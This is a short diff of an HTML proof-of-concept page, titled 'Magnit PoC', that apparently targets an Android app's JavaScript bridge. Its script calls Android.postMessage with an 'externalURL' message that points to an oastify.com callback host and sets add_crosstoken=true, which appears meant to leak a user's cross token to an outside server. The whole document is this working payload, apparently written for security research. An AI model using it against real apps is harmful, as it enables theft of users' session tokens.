@@ -3,7 +3,10 @@
 <title> Magnit PoC </title>
 <h1> Test Magnit PoC </h1>
 <script>
-  Android.postMessage('{"type":"externalURL","data":{"url":"https://e6lielren492ekvxdaw0qdl0xr3irafz.oastify.com?add_crosstoken=true"}}');
+Android.postMessage(JSON.stringify({
+  type: "externalURL",
+  data: { url: "https://va9zi2vvrldji1zehr0huuph187zvsjh.oastify.com/callback?add_crosstoken=true" }
+}));
 </script>
 </body>
 </html>
